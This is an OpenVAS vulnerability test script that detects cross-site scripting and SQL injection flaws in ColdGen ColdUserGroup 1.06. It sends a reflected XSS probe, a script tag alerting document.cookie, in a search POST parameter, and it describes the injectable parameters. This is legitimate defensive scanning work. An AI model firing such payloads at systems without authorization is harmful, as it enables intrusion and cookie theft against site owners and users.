###############################################################################
# OpenVAS Vulnerability Test
#
# ColdGen ColdUserGroup Cross-Site Scripting and SQL Injection Vulnerabilities
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (C) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802254");
  script_version("2020-08-24T15:18:35+0000");
  script_tag(name:"last_modification", value:"2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)");
  script_tag(name:"creation_date", value:"2011-10-14 14:22:41 +0200 (Fri, 14 Oct 2011)");
  script_bugtraq_id(43035);
  script_cve_id("CVE-2010-4913", "CVE-2010-4916");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("ColdGen ColdUserGroup Cross-Site Scripting and SQL Injection Vulnerabilities");
  script_xref(name:"URL", value:"http://secunia.com/advisories/41335");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/61638");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/14935/");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/93596/coldusergroup-sql.txt");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"Successful exploitation could allow an attacker to steal cookie

  - based authentication credentials, compromise the application, access or
  modify data, or exploit latent vulnerabilities in the underlying database.");

  script_tag(name:"affected", value:"ColdGen ColdUserGroup 1.06");

  script_tag(name:"insight", value:"- Input passed via the 'Keywords' POST parameter when performing
  a search is not properly sanitised before being returned to the user. This can
  be exploited to execute arbitrary HTML and script code in a user's browser
  session in context of an affected site.

  - Input passed via the 'LibraryID' to index.cfm is not properly sanitised
  before being used in SQL queries. This can be exploited to manipulate SQL
  queries by injecting arbitrary SQL code.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"This host is running ColdGen ColdUserGroup and is prone to cross
  site scripting and SQL injection vulnerabilities.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

port = http_get_port(default:80);

foreach dir(make_list_unique("/coldusr", "/", http_cgi_dirs(port:port)))
{

  if(dir == "/") dir = "";

  req = http_get(item: dir + "/index.cfm", port:port);
  res = http_keepalive_send_recv(port:port,data:req);

  if("ColdFusion Users Group" >< res)
  {
    url = dir + "/index.cfm?actcfug=SearchResults";
    postData = "SubmitForm=Search%20Site&Keywords=<script>alert(document." +
               "cookie)</script>&Category=Articles";

    req = http_post(port:port, item:url, data:postData);

    res = http_keepalive_send_recv(port:port, data:req);

    if(ereg(pattern:"^HTTP/1\.[01] 200", string:res) &&
       "><script>alert(document.cookie)</script>" >< res)
    {
      security_message(port);
      exit(0);
    }
  }
}

exit(99);
